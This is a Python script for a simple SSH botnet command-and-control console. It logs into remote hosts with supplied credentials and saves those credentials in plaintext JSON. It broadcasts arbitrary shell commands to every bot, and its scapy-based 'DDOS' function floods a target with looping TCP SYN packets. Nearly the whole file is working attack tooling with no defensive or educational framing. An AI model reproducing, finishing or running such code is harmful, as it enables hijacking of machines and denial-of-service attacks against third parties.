import sys
from pexpect import pxssh 
from scapy.all import *
import json

def display_menu():
    print('1. List Bots')
    print('2. Run Command')
    print('3. Add Bot')
    print('4. DDOS')
    print('5. Exit')
    print('-'*10)

def connect_ssh(host,port,user,password):
    try:
        s= pxssh.pxssh()
        s.login(host,user,password,port = port,login_timeout=5)
        return s
    except Exception as e:
        print(f"error : {e}")
        return None

def add_bot(host,user,password,port):
    try:
        session = connect_ssh(host=host,port=port,user=user,password=password)
        if session:
            client_info = {'host':host,'user':user,'password':password,'port' : port,'session':session}
            botnet.append(client_info)
            print("[+]Bot added")
        else:
            print('[-]Failed to add Bot')
    except Exception as e:
        print(f'Error {e}')

def send_cmd(session,cmd):
    session.sendline(cmd)
    session.prompt()
    return session.before

def botnet_cmd(cmd):
    for client in botnet:
        if 'session' in client:
            session = client['session']
            output = send_cmd(session,cmd)
            print(f"[+]Output from {client['host']} : {output.decode()}")
        else:
            print(f"No session for {client['host']}")

def exe_cmd():
    while True:
        if not botnet:
            print("No bots available.")
            break

        run = input("Command or exit : ")
        if run.lower == 'exit':
            break
        botnet_cmd(run)

def save_botnet():
    for client in botnet:
        botnet_data = [{
            'host':client['host'],
            'port':client['port'],
            'user':client['user'],
            'password':client['password'],
            }]
        with open ('bots.json','w') as f:
            json.dump(botnet_data,f)

def load_botnet():
    global botnet
    botnet=[]
    try:
        with open('bots.json','r') as f:
            botnet_data = json.load(f)
        for client_data in botnet_data:
            session = connect_ssh(
                client_data['host'],
                client_data['port'],
                client_data['user'],
                client_data['password']
            )
            if session:
                    client_data['session'] = session
                    print(f'Reconnected to {client_data['host']}')
                    botnet.append(client_data)          
            else:
                print(f"Falied to reconnect to bot {client_data['host']}")
    except Exception as e:
        print(f'Error : {e}')


def ddos():
    target_ip = ''
    target_port = 80

    ip = IP(dst=target_ip)
    tcp=TCP(sport=RandShort(),dport = target_port,flags = 'S')
    raw = Raw('X'*1024)
    p=ip/tcp/raw
    send(p,loop = 1,verbose = 1)

botnet= []
load_botnet()
while True:
    display_menu()
    option = input('Option : ')
    if option == '1':
        if botnet:
            print("\n")
            for client in botnet:
                print(str(client))
            print("\n")
    elif option == '2':
        exe_cmd()
    elif option == '3':
        host = input("ip : ")
        port = int(input("port : "))
        user = input("username :")
        password = input("password :")
        add_bot(host,user,password,port)
        save_botnet()
    elif option == '4':
        ddos()
    elif option == '5':
        save_botnet()
        sys.exit(1)